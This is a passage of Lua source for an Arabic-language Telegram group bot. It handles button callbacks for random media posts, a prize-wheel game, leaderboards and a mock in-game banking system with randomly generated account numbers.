{text = '• مره أخرى •', callback_data =data.sender_user_id..'/fillm'}, 
},
{
{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}
},
}
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. chat_id .. '&photo=https://t.me/MoviesDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
bot.deleteMessages(chat_id,{[1]= msg_id})
end
end

if Text and Text:match('(%d+)/anme') then
local UserId = Text:match('(%d+)/anme')
if tonumber(data.sender_user_id) == tonumber(UserId) then
Abs = math.random(2,140);
local Text ='تم اختيار انمي لك'
keyboard = {}
keyboard.inline_keyboard = {
{
{text = '• مره أخرى •', callback_data =data.sender_user_id..'/anme'}, 
},
{
{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}
},
}
https.request("https://api.telegram.org/bot"..Token..'/sendphoto?chat_id=' .. chat_id .. '&photo=https://t.me/AnimeDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
bot.deleteMessages(chat_id,{[1]= msg_id})
end
end

if Text and Text:match('(%d+)/stor') then
local UserId = Text:match('(%d+)/stor')
if tonumber(data.sender_user_id) == tonumber(UserId) then
Abs = math.random(2,140);
local Text =''
keyboard = {}
keyboard.inline_keyboard = {
{
{text = '• مره أخرى •', callback_data =data.sender_user_id..'/stor'}, 
},
{
{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}
},
}
https.request("https://api.telegram.org/bot"..Token..'/sendanimation?chat_id=' .. chat_id .. '&animation=https://t.me/stortolen/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
bot.deleteMessages(chat_id,{[1]= msg_id})
end
end

if Text and Text:match('(%d+)/remix') then
local UserId = Text:match('(%d+)/remix')
if tonumber(data.sender_user_id) == tonumber(UserId) then
Abs = math.random(2,140);
local Text ='*↯︙تم اختيار ريمكس لك*'
keyboard = {}
keyboard.inline_keyboard = {
{
{text = '• مره أخرى •', callback_data =data.sender_user_id..'/remix'}, 
},
{
{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}
},
}
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. chat_id .. '&voice=https://t.me/RemixDavid/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
bot.deleteMessages(chat_id,{[1]= msg_id})
end
end

if Text and Text:match('(%d+)/ashar') then
local UserId = Text:match('(%d+)/ashar')
if tonumber(data.sender_user_id) == tonumber(UserId) then
Abs = math.random(2,140);
local Text =' تم اختيار الشعر لك'
keyboard = {}
keyboard.inline_keyboard = {
{
{text = '• مره أخرى •', callback_data =data.sender_user_id..'/ashar'}, 
},
{
{text = '↯ TeAm MeLaNo   ', url="t.me/QQOQQD"}
},
}
https.request("https://api.telegram.org/bot"..Token..'/sendVoice?chat_id=' .. chat_id .. '&voice=https://t.me/L1BBBL/'..Abs..'&caption=' .. URL.escape(Text).."&reply_to_message_id=0&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
bot.deleteMessages(chat_id,{[1]= msg_id})
end
end

if Text and Text:match('(%d+)/happywheel') then
    local UserId = Text:match('(%d+)/happywheel')
    if tonumber(data.sender_user_id) == tonumber(UserId) then
    local media = "https://t.me/QQOQQD/24"
    local msg_media = {
    type = "video",
    media = media,
    caption = '',
    parse_mode = "Markdown"                    
    }     
    local keyboard = {} 
    keyboard.inline_keyboard = {
    {
    {text = '• توقف •', callback_data=data.sender_user_id.."/play_wheel"}
    },
    }
    local msg_reply = msg_id/2097152/0.5
    redis:set(bot_id.."happywheel:st:"..UserId..":"..chat_id, true)
    https.request("http://api.telegram.org/bot"..Token.."/editmessagemedia?chat_id="..chat_id.."&message_id="..msg_reply.."&media="..JSON.encode(msg_media).."&reply_markup="..JSON.encode(keyboard))
    end 
    end
    
if Text and Text:match('(%d+)/play_wheel') then
    local UserId = Text:match('(%d+)/play_wheel')
    if tonumber(data.sender_user_id) == tonumber(UserId) and redis:get(bot_id.."happywheel:st:"..UserId..":"..chat_id) then
    redis:del(bot_id.."happywheel:st:"..UserId..":"..chat_id)
    local media = {
      {
        "https://t.me/QQOQQD/14","مبروك ربحت 10000000 دينار 💵","10000000"
      },
      {
        "https://t.me/QQOQQD/14","مبروك ربحت 5000000 دينار 💵","5000000"
      },
      {
        "https://t.me/QQOQQD/14","مبروك ربحت 1000000 دينار 💵","1000000"
      },
      {
        "https://t.me/QQOQQD/14","مبروك ربحت 100000 دينار 💵","100000"
      },
      {
        "https://t.me/QQOQQD/16","مبروك ربحت 4 قصور","4"
      },
      {
        "https://t.me/QQOQQD/15","مبروك ربحت 8 فيلات","8"
      },
      {
        "https://t.me/QQOQQD/17","مبروك ربحت 15 منزل","15"
      },
      {
        "https://t.me/QQOQQD/20","مبروك ربحت 5 ماسات","5"
      },
      {
        "https://t.me/QQOQQD/21","مبروك ربحت 6 قلادات","6"
      },
      {
        "https://t.me/QQOQQD/22","مبروك ربحت 10 اساور","10"
      },
      {
        "https://t.me/QQOQQD/23","مبروك ربحت 20 خاتم","20"
      },
      {
        "https://t.me/QQOQQD/14","مبروك ربحت مضاعفة نصف الفلوس","1"
      },
      {
        "https://t.me/QQOQQD/14","مبروك خسرت ربع فلوسك","1"
      },
    }
    local rand = math.random(1,11)
    local msg_media = {
    type = "photo",
    media = media[rand][1],
    caption = media[rand][2],
    parse_mode = "Markdown"                    
    }     
    local keyboard = {} 
    keyboard.inline_keyboard = {
    {
    {text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
    },
    }
    local msg_reply = msg_id/2097152/0.5
ballance = redis:get(bot_id.."boob"..data.sender_user_id) or 0
if rand == 1 then
ballancek = ballance + media[rand][3]
redis:set(bot_id.."boob"..data.sender_user_id , math.floor(ballancek))
elseif rand == 2 then
ballancek = ballance + media[rand][3]
redis:set(bot_id.."boob"..data.sender_user_id , math.floor(ballancek))
elseif rand == 3 then
ballancek = ballance + media[rand][3]
redis:set(bot_id.."boob"..data.sender_user_id , math.floor(ballancek))
elseif rand == 4 then
ballancek = ballance + media[rand][3]
redis:set(bot_id.."boob"..data.sender_user_id , math.floor(ballancek))
elseif rand == 5 then
local akrksrnumm = redis:get(bot_id.."akrksrnum"..data.sender_user_id) or 0
local akrksrnoww = tonumber(akrksrnumm) + media[rand][3]
redis:set(bot_id.."akrksrnum"..data.sender_user_id , math.floor(akrksrnoww))
ksrnamed = "قصر"
redis:set(bot_id.."akrksrname"..data.sender_user_id,ksrnamed)
elseif rand == 6 then
local akrfelnumm = redis:get(bot_id.."akrfelnum"..data.sender_user_id) or 0
local akrfelnoww = tonumber(akrfelnumm) + media[rand][3]
redis:set(bot_id.."akrfelnum"..data.sender_user_id , math.floor(akrfelnoww))
felnamed = "فيلا"
redis:set(bot_id.."akrfelname"..data.sender_user_id,felnamed)
elseif rand == 7 then
local akrmnznumm = redis:get(bot_id.."akrmnznum"..data.sender_user_id) or 0
local akrmnznoww = tonumber(akrmnznumm) + media[rand][3]
redis:set(bot_id.."akrmnznum"..data.sender_user_id , math.floor(akrmnznoww))
mnznamed = "منزل"
redis:set(bot_id.."akrmnzname"..data.sender_user_id,mnznamed)
elseif rand == 8 then
local mgrmasnumm = redis:get(bot_id.."mgrmasnum"..data.sender_user_id) or 0
local mgrmasnoww = tonumber(mgrmasnumm) + media[rand][3]
redis:set(bot_id.."mgrmasnum"..data.sender_user_id , math.floor(mgrmasnoww))
masnamed = "ماسه"
redis:set(bot_id.."mgrmasname"..data.sender_user_id,masnamed)
elseif rand == 9 then
local mgrkldnumm = redis:get(bot_id.."mgrkldnum"..data.sender_user_id) or 0
local mgrkldnoww = tonumber(mgrkldnumm) + media[rand][3]
redis:set(bot_id.."mgrkldnum"..data.sender_user_id , math.floor(mgrkldnoww))
kldnamed = "قلاده"
redis:set(bot_id.."mgrkldname"..data.sender_user_id,kldnamed)
elseif rand == 10 then
local mgrswrnumm = redis:get(bot_id.."mgrswrnum"..data.sender_user_id) or 0
local mgrswrnoww = tonumber(mgrswrnumm) + media[rand][3]
redis:set(bot_id.."mgrswrnum"..data.sender_user_id , math.floor(mgrswrnoww))
swrnamed = "سوار"
redis:set(bot_id.."mgrswrname"..data.sender_user_id,swrnamed)
elseif rand == 11 then
local mgrktmnumm = redis:get(bot_id.."mgrktmnum"..data.sender_user_id) or 0
local mgrktmnoww = tonumber(mgrktmnumm) + media[rand][3]
redis:set(bot_id.."mgrktmnum"..data.sender_user_id , math.floor(mgrktmnoww))
ktmnamed = "خاتم"
redis:set(bot_id.."mgrktmname"..data.sender_user_id,ktmnamed)
elseif rand == 12 then
ballancek = ballance / 2
ballancekk = math.floor(ballancek) + ballance
redis:set(bot_id.."boob"..data.sender_user_id , ballancekk)
else
ballancek = ballance / 4
ballancekk = ballance - math.floor(ballancek)
redis:set(bot_id.."boob"..data.sender_user_id , math.floor(ballancekk))
end
https.request("http://api.telegram.org/bot"..Token.."/editmessagemedia?chat_id="..chat_id.."&message_id="..msg_reply.."&media="..JSON.encode(msg_media).."&reply_markup="..JSON.encode(keyboard))
end 
end

if Text and Text:match('(%d+)/toptop') then
local UserId = Text:match('(%d+)/toptop')
if tonumber(data.sender_user_id) == tonumber(UserId) then
local toptop = "↯︙اهلين فيك في قوائم التوب\nللمزيد من التفاصيل - [@QQOQQD]\n"
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = 'الزرف', data = data.sender_user_id..'/topzrf'},{text = 'الفلوس', data = data.sender_user_id..'/topmon'},{text = 'زواجات', data = data.sender_user_id..'/zoztee'},
},
{
{text = 'المتبرعين', data = data.sender_user_id..'/motbra'},{text = 'الشركات', data = data.sender_user_id..'/shrkatt'},
},
{
{text = 'اخفاء', data = data.sender_user_id..'/delAmr'}, 
},
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›', url="t.me/QQOQQD"},
},
}
}
bot.editMessageText(chat_id,msg_id,toptop, 'md', true, false, reply_markup)
end
end

if Text and Text:match('(%d+)/shrkatt') then
local UserId = Text:match('(%d+)/shrkatt')
if tonumber(data.sender_user_id) == tonumber(UserId) then
local companys = redis:smembers(bot_id.."companys:")
if #companys == 0 then
return bot.sendText(chat_id,msg_id,"↯︙لا يوجد شركات","md",true)
end
local top_company = {}
for A,N in pairs(companys) do
local Cmony = 0
for k,v in pairs(redis:smembers(bot_id.."company:mem:"..N)) do
local mem_mony = tonumber(redis:get(bot_id.."boob"..v)) or 0
Cmony = Cmony + mem_mony
end
local owner_id = redis:get(bot_id.."companys_owner:"..N)
local Cid = redis:get(bot_id.."companys_id:"..N)
table.insert(top_company, {tonumber(Cmony) , owner_id , N , Cid})
end
table.sort(top_company, function(a, b) return a[1] > b[1] end)
local num = 1
local emoji ={ 
"🥇" ,
"🥈",
"🥉",
"4)",
"5)",
"6)",
"7)",
"8)",
"9)",
"10)",
"11)",
"12)",
"13)",
"14)",
"15)",
"16)",
"17)",
"18)",
"19)",
"20)"
}
local msg_text = "توب اعلى 20 شركة : \n"
for k,v in pairs(top_company) do
if num <= 20 then
local user_name = bot.getUser(v[2]).first_name or "لا يوجد اسم"
local Cname = v[3]
local Cid = v[4]
local mony = v[1]
gflous = string.format("%.0f", mony):reverse():gsub( "(%d%d%d)" , "%1," ):reverse():gsub("^,","")
local emoo = emoji[k]
num = num + 1
msg_text = msg_text..emoo.." "..gflous.."  💵 l "..Cname.."\n"
gg = "━━━━━━━━━\n\nملاحظة : اي شخص مخالف للعبة بالغش او حاط يوزر بينحظر من اللعبه وتتصفر فلوسه"
end
end
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '• رجوع •', data = data.sender_user_id..'/toptop'}, 
},
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
},
}
}
bot.editMessageText(chat_id,msg_id,msg_text..gg, 'html', true, false, reply_markup)
end
end

if Text and Text:match('(%d+)/motbra') then
local UserId = Text:match('(%d+)/motbra')
if tonumber(data.sender_user_id) == tonumber(UserId) then
  local F_Name = bot.getUser(data.sender_user_id).first_name
redis:set(bot_id..data.sender_user_id.."first_name:", F_Name)
local ban = bot.getUser(data.sender_user_id)
if ban.first_name then
news = "["..ban.first_name.."]("..ban.first_name..")"
else
news = " لا يوجد"
end
ballancee = redis:get(bot_id.."tabbroat"..data.sender_user_id) or 0
local bank_users = redis:smembers(bot_id.."taza")
if #bank_users == 0 then
return bot.sendText(chat_id,msg_id,"↯︙لا يوجد حسابات في البنك","md",true)
end
top_mony = "توب اعلى 20 شخص بالتبرعات :\n\n"
tabr_list = {}
for k,v in pairs(bank_users) do
local mony = redis:get(bot_id.."tabbroat"..v)
table.insert(tabr_list, {tonumber(mony) , v})
end
table.sort(tabr_list, function(a, b) return a[1] > b[1] end)
num = 1
emoji ={ 
"🥇" ,
"🥈",
"🥉",
"4)",
"5)",
"6)",
"7)",
"8)",
"9)",
"10)",
"11)",
"12)",
"13)",
"14)",
"15)",
"16)",
"17)",
"18)",
"19)",
"20)"
}
for k,v in pairs(tabr_list) do
if num <= 20 then
local user_name = bot.getUser(v[2]).first_name or "لا يوجد اسم"
tt =  "["..user_name.."]("..user_name..")"
local mony = v[1]
local convert_mony = string.format("%.0f",mony)
local emo = emoji[k]
num = num + 1
gflos = string.format("%.0f", mony):reverse():gsub( "(%d%d%d)" , "%1," ):reverse():gsub("^,","")
top_mony = top_mony..emo.." *"..gflos.." 💵* l "..tt.." \n"
gflous = string.format("%.0f", ballancee):reverse():gsub( "(%d%d%d)" , "%1," ):reverse():gsub("^,","")
gg = " ━━━━━━━━━\n*• you)*  *"..gflous.." 💵* l "..news.." \n\nملاحظة : اي شخص مخالف للعبة بالغش او حاط يوزر بينحظر من اللعبه وتتصفر فلوسه"
end
end
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '• رجوع •', data = data.sender_user_id..'/toptop'}, 
},
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
},
}
}
bot.editMessageText(chat_id,msg_id,top_mony..gg, 'md', true, false, reply_markup)
end
end

if Text and Text:match('(%d+)/zoztee') then
local UserId = Text:match('(%d+)/zoztee')
if tonumber(data.sender_user_id) == tonumber(UserId) then
  local zwag_users = redis:smembers(bot_id.."roogg1")
  if #zwag_users == 0 then
  return bot.editMessageText(chat_id,msg_id,"↯︙مافي زواجات حاليا","md",true)
  end
  top_zwag = "توب 30 اغلى زواجات :\n\n"
  zwag_list = {}
  for k,v in pairs(zwag_users) do
  local mahr = redis:get(bot_id.."rahr1"..v)
  local zwga = redis:get(bot_id.."rooga1"..v)
  table.insert(zwag_list, {tonumber(mahr) , v , zwga})
  end
  table.sort(zwag_list, function(a, b) return a[1] > b[1] end)
  znum = 1
  zwag_emoji ={ 
"🥇" ,
"🥈",
"🥉",
"4)",
"5)",
"6)",
"7)",
"8)",
"9)",
"10)",
"11)",
"12)",
"13)",
"14)",
"15)",
"16)",
"17)",
"18)",
"19)",
"20)",
"21)",
"22)",
"23)",
"24)",
"25)",
"26)",
"27)",
"28)",
"29)",
"30)"
  }
  for k,v in pairs(zwag_list) do
  if znum <= 30 then
  local zwg_name = bot.getUser(v[2]).first_name or "لا يوجد اسم"
  local zwga_name = bot.getUser(v[3]).first_name or redis:get(bot_id..v[3].."first_name:") or "لا يوجد اسم"
tt =  "["..zwg_name.."]("..zwg_name..")"
kk = "["..zwga_name.."]("..zwga_name..")"
local mony = v[1]
local convert_mony = string.format("%.0f",mony)
local emo = zwag_emoji[k]
znum = znum + 1
gflos = string.format("%.0f", mony):reverse():gsub( "(%d%d%d)" , "%1," ):reverse():gsub("^,","")
top_zwag = top_zwag..emo.." *"..gflos.." 💵* l "..tt.." 👫 "..kk.."\n"
gg = "\n\nملاحظة : اي شخص مخالف للعبة بالغش او حاط يوزر بينحظر من اللعبه وتتصفر فلوسه"
  end
  end
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '• رجوع •', data = data.sender_user_id..'/toptop'}, 
},
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
},
}
}
bot.editMessageText(chat_id,msg_id,top_zwag..gg, 'md', true, false, reply_markup)
end
end

if Text and Text:match('(%d+)/topzrf') then
local UserId = Text:match('(%d+)/topzrf')
if tonumber(data.sender_user_id) == tonumber(UserId) then
local ban = bot.getUser(data.sender_user_id)
if ban.first_name then
news = "["..ban.first_name.."]("..ban.first_name..")"
else
news = " لا يوجد"
end
zrfee = redis:get(bot_id.."rrfff"..data.sender_user_id) or 0
local ty_users = redis:smembers(bot_id.."rrfffid")
if #ty_users == 0 then
return bot.sendText(chat_id,msg_id,"↯︙لا يوجد احد","md",true)
end
ty_anubis = "توب 20 شخص زرفوا فلوس :\n\n"
ty_list = {}
for k,v in pairs(ty_users) do
local mony = redis:get(bot_id.."rrfff"..v)
table.insert(ty_list, {tonumber(mony) , v})
end
table.sort(ty_list, function(a, b) return a[1] > b[1] end)
num_ty = 1
emojii ={ 
"🥇" ,
"🥈",
"🥉",
"4)",
"5)",
"6)",
"7)",
"8)",
"9)",
"10)",
"11)",
"12)",
"13)",
"14)",
"15)",
"16)",
"17)",
"18)",
"19)",
"20)"
}
for k,v in pairs(ty_list) do
if num_ty <= 20 then
local user_name = bot.getUser(v[2]).first_name or "لا يوجد اسم"
tt =  "["..user_name.."]("..user_name..")"
local mony = v[1]
local convert_mony = string.format("%.0f",mony)
local emoo = emojii[k]
num_ty = num_ty + 1
gflos = string.format("%.0f", mony):reverse():gsub( "(%d%d%d)" , "%1," ):reverse():gsub("^,","")
ty_anubis = ty_anubis..emoo.." *"..gflos.." 💵* l "..tt.." \n"
gflous = string.format("%.0f", zrfee):reverse():gsub( "(%d%d%d)" , "%1," ):reverse():gsub("^,","")
gg = "\n━━━━━━━━━\n*• you)*  *"..gflous.." 💵* l "..news.." \n\nملاحظة : اي شخص مخالف للعبة بالغش او حاط يوزر بينحظر من اللعبه وتتصفر فلوسه"
end
end
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '• رجوع •', data = data.sender_user_id..'/toptop'}, 
},
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
},
}
}
bot.editMessageText(chat_id,msg_id,ty_anubis..gg, 'md', true, false, reply_markup)
end
end

if Text and Text:match('(%d+)/topmon') then
local UserId = Text:match('(%d+)/topmon')
if tonumber(data.sender_user_id) == tonumber(UserId) then
local F_Name = bot.getUser(data.sender_user_id).first_name
redis:set(bot_id..data.sender_user_id.."first_name:", F_Name)
local ban = bot.getUser(data.sender_user_id)
if ban.first_name then
news = "["..ban.first_name.."]("..ban.first_name..")"
else
news = " لا يوجد"
end
ballancee = redis:get(bot_id.."boob"..data.sender_user_id) or 0
local bank_users = redis:smembers(bot_id.."booob")
if #bank_users == 0 then
return bot.sendText(chat_id,msg_id,"↯︙لا يوجد حسابات في البنك","md",true)
end
top_mony = "توب اغنى 30 شخص :\n\n"
mony_list = {}
for k,v in pairs(bank_users) do
local mony = redis:get(bot_id.."boob"..v)
table.insert(mony_list, {tonumber(mony) , v})
end
table.sort(mony_list, function(a, b) return a[1] > b[1] end)
num = 1
emoji ={ 
"🥇" ,
"🥈",
"🥉",
"4)",
"5)",
"6)",
"7)",
"8)",
"9)",
"10)",
"11)",
"12)",
"13)",
"14)",
"15)",
"16)",
"17)",
"18)",
"19)",
"20)",
"21)",
"22)",
"23)",
"24)",
"25)",
"26)",
"27)",
"28)",
"29)",
"30)"
}
for k,v in pairs(mony_list) do
if num <= 30 then
local user_name = bot.getUser(v[2]).first_name or "لا يوجد اسم"
tt =  "["..user_name.."]("..user_name..")"
local mony = v[1]
local convert_mony = string.format("%.0f",mony)
local emo = emoji[k]
num = num + 1
gflos = string.format("%.0f", mony):reverse():gsub( "(%d%d%d)" , "%1," ):reverse():gsub("^,","")
top_mony = top_mony..emo.." *"..gflos.." 💵* l "..tt.." \n"
gflous = string.format("%.0f", ballancee):reverse():gsub( "(%d%d%d)" , "%1," ):reverse():gsub("^,","")
gg = " ━━━━━━━━━\n*• you)*  *"..gflous.." 💵* l "..news.." \n\n\nملاحظة : اي شخص مخالف للعبة بالغش او حاط يوزر بينحظر من اللعبه وتتصفر فلوسه"
end
end
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '• رجوع •', data = data.sender_user_id..'/toptop'}, 
},
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
},
}
}
bot.editMessageText(chat_id,msg_id,top_mony..gg, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/msalm') then
local UserId = Text:match('(%d+)/msalm')
if tonumber(data.sender_user_id) == tonumber(UserId) then
shakse = "طيبة"
redis:set(bot_id.."shkse"..data.sender_user_id,shakse)
cccall = redis:get(bot_id.."boobb"..data.sender_user_id)
ccctype = redis:get(bot_id.."bbobb"..data.sender_user_id)
msalm = "• وسوينا لك حساب في بنك  راومو🏦\n• وشحنالك 50 دينار 💵 هدية\n\n↯︙رقم حسابك ↢ ( `"..cccall.."` )\n↯︙نوع البطاقة ↢ ( "..ccctype.." )\n↯︙فلوسك ↢ ( 50 دينار 💵 )\n↯︙شخصيتك : طيبة 😇"
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
},
}
}
bot.editMessageText(chat_id,msg_id,msalm, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/shrer') then
local UserId = Text:match('(%d+)/shrer')
if tonumber(data.sender_user_id) == tonumber(UserId) then
shakse = "شريرة"
redis:set(bot_id.."shkse"..data.sender_user_id,shakse)
cccall = redis:get(bot_id.."boobb"..data.sender_user_id)
ccctype = redis:get(bot_id.."bbobb"..data.sender_user_id)
msalm = "• وسوينا لك حساب في بنك  راومو🏦\n• وشحنالك 50 دينار 💵 هدية\n\n↯︙رقم حسابك ↢ ( `"..cccall.."` )\n↯︙نوع البطاقة ↢ ( "..ccctype.." )\n↯︙فلوسك ↢ ( 50 دينار 💵 )\n↯︙شخصيتك : شريرة 😈"
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
},
}
}
bot.editMessageText(chat_id,msg_id,msalm, 'md', true, false, reply_markup)
end
end

if Text and Text:match('(%d+)/master') then
local UserId = Text:match('(%d+)/master')
if tonumber(data.sender_user_id) == tonumber(UserId) then
creditcc = math.random(5000000000000000,5999999999999999);
mast = "ماستر"
balas = 50
local ban = bot.getUser(data.sender_user_id)
if ban.first_name then
news = ""..ban.first_name..""
else
news = " لا يوجد"
end
local banid = data.sender_user_id
redis:set(bot_id.."bobna"..data.sender_user_id,news)
redis:set(bot_id.."boob"..data.sender_user_id,balas)
redis:set(bot_id.."boobb"..data.sender_user_id,creditcc)
redis:set(bot_id.."bbobb"..data.sender_user_id,mast)
redis:set(bot_id.."boballname"..creditcc,news)
redis:set(bot_id.."boballbalc"..creditcc,balas)
redis:set(bot_id.."boballcc"..creditcc,creditcc)
redis:set(bot_id.."boballban"..creditcc,mast)
redis:set(bot_id.."boballid"..creditcc,banid)
redis:sadd(bot_id.."booob",data.sender_user_id)
ttshakse = '↯︙اختر شخصيتك في اللعبة :\n'
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = 'شخصية طيبة 😇', data = data.sender_user_id..'/msalm'},{text = 'شخصية شريرة 😈', data = data.sender_user_id..'/shrer'},
},
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
}
}
bot.editMessageText(chat_id,msg_id,ttshakse, 'md', true, false, reply_markup)
end
end


if Text and Text:match('(%d+)/visaa') then
local UserId = Text:match('(%d+)/visaa')
if tonumber(data.sender_user_id) == tonumber(UserId) then
creditvi = math.random(10000000000000,4999999999999999);
visssa = "فيزا"
balas = 50
local ban = bot.getUser(data.sender_user_id)
if ban.first_name then
news = ""..ban.first_name..""
else
news = " لا يوجد"
end
local banid = data.sender_user_id
redis:set(bot_id.."bobna"..data.sender_user_id,news)
redis:set(bot_id.."boob"..data.sender_user_id,balas)
redis:set(bot_id.."boobb"..data.sender_user_id,creditvi)
redis:set(bot_id.."bbobb"..data.sender_user_id,visssa)
redis:set(bot_id.."boballname"..creditvi,news)
redis:set(bot_id.."boballbalc"..creditvi,balas)
redis:set(bot_id.."boballcc"..creditvi,creditvi)
redis:set(bot_id.."boballban"..creditvi,visssa)
redis:set(bot_id.."boballid"..creditvi,banid)
redis:sadd(bot_id.."booob",data.sender_user_id)
ttshakse = '↯︙اختر شخصيتك في اللعبة :\n'
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = 'شخصية طيبة 😇', data = data.sender_user_id..'/msalm'},{text = 'شخصية شريرة 😈', data = data.sender_user_id..'/shrer'},
},
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
}
}
bot.editMessageText(chat_id,msg_id,ttshakse, 'md', true, false, reply_markup)
end
end

if Text and Text:match('(%d+)/express') then
local UserId = Text:match('(%d+)/express')
if tonumber(data.sender_user_id) == tonumber(UserId) then
creditex = math.random(6000000000000000,6999999999999999);
exprs = "اكسبرس"
balas = 50
local ban = bot.getUser(data.sender_user_id)
if ban.first_name then
news = ""..ban.first_name..""
else
news = " لا يوجد"
end
local banid = data.sender_user_id
redis:set(bot_id.."bobna"..data.sender_user_id,news)
redis:set(bot_id.."boob"..data.sender_user_id,balas)
redis:set(bot_id.."boobb"..data.sender_user_id,creditex)
redis:set(bot_id.."bbobb"..data.sender_user_id,exprs)
redis:set(bot_id.."boballname"..creditex,news)
redis:set(bot_id.."boballbalc"..creditex,balas)
redis:set(bot_id.."boballcc"..creditex,creditex)
redis:set(bot_id.."boballban"..creditex,exprs)
redis:set(bot_id.."boballid"..creditex,banid)
redis:sadd(bot_id.."booob",data.sender_user_id)
ttshakse = '↯︙اختر شخصيتك في اللعبة :\n'
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = 'شخصية طيبة 😇', data = data.sender_user_id..'/msalm'},{text = 'شخصية شريرة 😈', data = data.sender_user_id..'/shrer'},
},
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
}
}
bot.editMessageText(chat_id,msg_id,ttshakse, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/tdbel') then
local UserId = Text:match('(%d+)/tdbel')
if tonumber(data.sender_user_id) == tonumber(UserId) then
cccall = redis:get(bot_id.."tdbelballance"..data.sender_user_id) or 0
ballance = redis:get(bot_id.."boob"..data.sender_user_id) or 0
cccallc = tonumber(cccall) + tonumber(cccall)
cccallcc = tonumber(ballance) + cccallc
redis:set(bot_id.."boob"..data.sender_user_id,cccallcc)
redis:del(bot_id.."tdbelballance"..data.sender_user_id)
local convert_mony = string.format("%.0f",cccallc)
local convert_monyy = string.format("%.0f",cccallcc)
msalm = "⌯ مبروك ربحت بالسحب\n\n↯︙المبلغ : "..convert_mony.."\nرصيدك الان : "..convert_monyy.."\n"
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '??𝐸𝐺𝐺𝐴',url="t.me/QQOQQD"}, 
},
}
}
bot.editMessageText(chat_id,msg_id,msalm, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/nonono') then
local UserId = Text:match('(%d+)/nonono')
if tonumber(data.sender_user_id) == tonumber(UserId) then
cccall = redis:get(bot_id.."tdbelballance"..data.sender_user_id) or 0
ballance = redis:get(bot_id.."boob"..data.sender_user_id) or 0
cccallcc = tonumber(ballance) + tonumber(cccall)
redis:set(bot_id.."boob"..data.sender_user_id,cccallcc)
redis:del(bot_id.."tdbelballance"..data.sender_user_id)
local convert_mony = string.format("%.0f",cccall)
local convert_monyy = string.format("%.0f",ballance)
msalm = "⌯ حظ اوفر ماربحت شي\n\n↯︙المبلغ : "..convert_mony.."\n↯︙رصيدك الان :"..convert_monyy.."\n"
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
},
}
}
bot.editMessageText(chat_id,msg_id,msalm, 'md', true, false, reply_markup)
end
end
if Text and Text:match('(%d+)/halfdbel') then
local UserId = Text:match('(%d+)/halfdbel')
if tonumber(data.sender_user_id) == tonumber(UserId) then
cccall = redis:get(bot_id.."tdbelballance"..data.sender_user_id) or 0
ballance = redis:get(bot_id.."boob"..data.sender_user_id) or 0
cccallcc = tonumber(ballance) - tonumber(cccall)
redis:set(bot_id.."boob"..data.sender_user_id,cccallcc)
cccall = redis:get(bot_id.."tdbelballance"..data.sender_user_id)
if tonumber(cccall) < 0 then
redis:set(bot_id.."boob"..data.sender_user_id,0)
end
redis:del(bot_id.."tdbelballance"..data.sender_user_id)
local convert_mony = string.format("%.0f",cccall)
local convert_monyy = string.format("%.0f",cccallcc)
msalm = "⌯ خسرت بالسحب ☹️\n\n↯︙المبلغ : "..convert_mony.."\nرصيدك الان : "..convert_monyy.."\n"
local reply_markup = bot.replyMarkup{
type = 'inline',
data = {
{
{text = '‹ ‹ TeAm MeLaNo  ›  ›',url="t.me/QQOQQD"}, 
},
}
}
